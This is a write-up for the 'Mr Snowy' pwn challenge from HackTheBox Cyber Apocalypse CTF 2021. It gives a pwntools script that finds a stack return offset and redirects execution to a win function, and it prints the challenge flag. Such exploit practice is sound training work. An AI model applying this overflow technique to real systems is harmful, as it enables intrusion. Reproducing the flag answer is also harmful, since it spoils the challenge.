---
name: Mr Snowy (2021)
event: HackTheBox Cyber Apocalypse CTF 2021
category: Pwn
description: Writeup for Mr Snowy (Pwn) - HackTheBox Cyber Apocalypse CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Mr Snowy

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/20FkOdoMiRU/0.jpg)](https://youtu.be/20FkOdoMiRU?t=1434s "HTB Cyber Apocalypse CTF 2021: Mr Snowy")

## Challenge Description

> Mr Snowy There is ❄️ snow everywhere!! Kids are playing around, everything looks amazing. But, this ☃️ snowman... it scares me.. He is always ? staring at Santa's house. Something must be wrong with him.

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './mr_snowy'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Build the payload
payload = flat({
    offset: elf.symbols.deactivate_camera
})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b'>', b'1')
io.sendlineafter(b'>', payload)

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `HTB{d4sh1nG_thr0ugH_th3_sn0w_1n_4_0n3_h0r53_0p3n_sl31gh!!!}`
